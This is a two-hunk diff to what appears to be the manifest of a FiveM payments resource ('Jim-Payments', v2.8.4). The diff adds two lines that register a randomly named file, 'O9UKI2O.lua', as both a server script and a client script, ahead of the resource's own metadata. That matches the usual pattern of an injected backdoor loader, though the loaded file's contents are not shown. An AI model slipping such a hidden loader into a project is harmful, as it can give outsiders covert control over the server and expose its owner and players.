@@ -1,3 +1,5 @@
+server_script "O9UKI2O.lua"
+client_script "O9UKI2O.lua"
 name "Jim-Payments"
 author "Jimathy"
 version "v2.8.4"
